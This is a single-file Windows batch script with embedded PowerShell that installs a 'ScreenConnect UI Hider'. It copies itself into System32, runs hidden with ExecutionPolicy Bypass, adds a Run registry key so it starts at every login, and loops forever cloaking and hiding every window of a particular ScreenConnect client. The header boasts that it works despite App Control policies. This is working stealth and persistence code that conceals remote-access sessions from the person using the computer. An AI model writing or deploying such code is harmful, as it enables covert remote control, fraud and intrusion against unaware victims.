@echo off
setlocal EnableExtensions

REM ============================================================
REM  ScreenConnect UI Hider - ALL IN ONE (single file)
REM  - Saves to C:\Windows\System32\hide
REM  - Starts hider in background (survives CMD close)
REM  - Auto-starts at every login
REM  Run: double-click this file, or: sc-hide.cmd
REM  Uninstall: sc-hide.cmd uninstall
REM ============================================================

set "BATCH_SELF=%~f0"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"

if /I "%~1"=="uninstall" (
    echo Removing...
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HideScreenConnectUI" /f >nul 2>&1
    for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq powershell.exe" /FO LIST 2^>nul ^| find "PID:"') do (
        wmic process where "ProcessId=%%a" get CommandLine 2>nul | find "hide-sc.ps1" >nul && taskkill /PID %%a /F >nul 2>&1
    )
    if exist "%SystemRoot%\System32\hide" rmdir /s /q "%SystemRoot%\System32\hide" 2>nul
    echo Removed.
    exit /b 0
)

echo Installing ScreenConnect hider...

"%PS%" -NoProfile -ExecutionPolicy Bypass -Command ^
  "try { ^
     $installDir = Join-Path $env:SystemRoot 'System32\hide'; ^
     $scriptPath = Join-Path $installDir 'hide-sc.ps1'; ^
     $psExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'; ^
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null; ^
     $raw = Get-Content -LiteralPath $env:BATCH_SELF -Raw; ^
     if ($raw -notmatch '(?ms)^#PS1#\r?\n(.*\S)\s*$') { throw 'Embedded script not found in this file.' }; ^
     $Matches[1] | Out-File -LiteralPath $scriptPath -Encoding UTF8 -Force; ^
     Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" -ErrorAction SilentlyContinue | ^
       Where-Object { $_.CommandLine -like '*hide-sc.ps1*' } | ^
       ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; ^
     Start-Process -FilePath $psExe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$scriptPath -WindowStyle Hidden; ^
     $runValue = [char]34 + $psExe + [char]34 + ' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ' + [char]34 + $scriptPath + [char]34; ^
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'HideScreenConnectUI' -Value $runValue -Force ^
   } catch { ^
     Write-Host $_.Exception.Message -ForegroundColor Red; ^
     exit 1 ^
   }"

if errorlevel 1 (
    echo Install failed.
    exit /b 1
)

echo.
echo Done. Files saved to %SystemRoot%\System32\hide
echo Hider is running in background. You can close this window.
exit /b 0

#PS1#
# ScreenConnect UI Hider - runs forever (no .exe, works with App Control policies)
$ScInstallDir = 'C:\Program Files (x86)\ScreenConnect Client (fd944d6092d0e488)'

$mutex = New-Object System.Threading.Mutex($false, 'Local\ScHidePowerShell')
if (-not $mutex.WaitOne(0, $false)) { exit 0 }

if (-not ([System.Management.Automation.PSTypeName]'ScWin32').Type) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class ScWin32 {
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    [DllImport("dwmapi.dll")] public static extern int DwmSetWindowAttribute(IntPtr hWnd, int attr, ref int val, int size);
    public const int GWL_EXSTYLE = -20;
    public const int WS_EX_TOOLWINDOW = 0x80;
    public const int WS_EX_APPWINDOW = 0x40000;
    public const int SW_HIDE = 0;
    public const int DWMWA_CLOAK = 13;
}
"@ -ErrorAction Stop
}

while ($true) {
    $pids = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object { $_.ExecutablePath -like "$ScInstallDir*" } |
        Select-Object -ExpandProperty ProcessId)

    $script:targetPids = $pids

    [ScWin32]::EnumWindows({
        param($hWnd, $lParam)
        [uint32]$wp = 0
        [ScWin32]::GetWindowThreadProcessId($hWnd, [ref]$wp)
        if ($script:targetPids -contains [int]$wp) {
            $cloak = 1
            [ScWin32]::DwmSetWindowAttribute($hWnd, [ScWin32]::DWMWA_CLOAK, [ref]$cloak, 4) | Out-Null
            $s = [ScWin32]::GetWindowLong($hWnd, [ScWin32]::GWL_EXSTYLE)
            $s = ($s -bor [ScWin32]::WS_EX_TOOLWINDOW) -band (-bnot [ScWin32]::WS_EX_APPWINDOW)
            [ScWin32]::SetWindowLong($hWnd, [ScWin32]::GWL_EXSTYLE, $s)
            [ScWin32]::ShowWindow($hWnd, [ScWin32]::SW_HIDE)
        }
        return $true
    }, [IntPtr]::Zero) | Out-Null

    Start-Sleep -Milliseconds 1
}
